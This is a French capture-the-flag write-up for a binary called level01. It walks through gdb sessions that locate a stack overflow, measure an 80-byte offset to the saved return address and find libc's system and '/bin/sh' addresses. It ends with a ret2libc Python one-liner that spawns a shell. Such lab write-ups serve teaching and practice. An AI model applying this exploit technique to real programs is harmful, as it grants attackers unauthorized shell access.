# LEVEL 01


Le binaire level01 est composé de 3 fonction et lit 2 fois sur l'entrée standard via **fgets**:

<pre>
verify_user_name
verify_user_pass
main
</pre>

Aucune de ces fonction n'appelle la fonction system ou ne créer de shell, mais la fonction **main** appelle successivement la fonction **verify_user_name** et **verify_user_pass**.

Chaque fonction **verify_** compare les strings récupérées avec:

<pre>
dat_wil => verify_user_name
admin	=> verify_user_pass
</pre>

Le **buffer static** qui stocke le **pass** est nettement inférieur à la taille de la string récupérée dans le second **fgets()**, on peux Overflow la stack grâce a ce buffer.


On cherche si l'on peux écraser **EIP** et si oui à partir de quels octets et combien d'octects en plus nous pouvons écrire:
<pre>
b *main + 169	// Apres le second fgets
run
dat_will		// 1er string
AAAAAAAA		// 2eme string

i f

Stack level 0, frame at 0xffffd720:
 eip = 0x8048579 in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args:
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebx at 0xffffd710, ebp at 0xffffd718, edi at 0xffffd714, eip at 0xffffd71c

i r

eax            0xffffd6cc       -10548

addr de saved EIP => 0xffffd71c
addr du buffer    => 0xffffd6cc

0xffffd71c - 0xffffd6cc => 0x50 => 80

offset buffer/EIP 80 oct
</pre>

Nous écrasons **EIP** à partir de l'octet 80 et notre buffer fait un taille de 100 octets.

Nous pouvons effectuer un **RET2LIBC**:

<pre>
(gdb) b *main
Breakpoint 1 at 0x80484d0
(gdb) r
Starting program: /home/users/level01/level01

Breakpoint 1, 0x080484d0 in main ()
(gdb) info proc map
process 1815
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        						...
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
								...
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2b000,0xf7e2c000,"/bin/sh"
Pattern not found.
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.

p system
$1 = {text variable, no debug info} 0xf7e6aed0 system

system 		=> 0xf7e6aed0
"/bin/sh"	=> 0xf7f897ec
</pre>

Nous pouvons donc formater notre exploit de la façon suivante:
<pre>
./level01
"dat_will"
"A*80 + &system + DUMM + &(/bin/sh)"
</pre>

# EXPLOIT
<pre>
SHELL=/bin/sh

(python -c "print 'dat_wil\n' + 'A'*80 + '\xd0\xae\xe6\xf7' + 'DUMM' + '\xec\x97\xf8\xf7'";cat) | ./level01
</pre>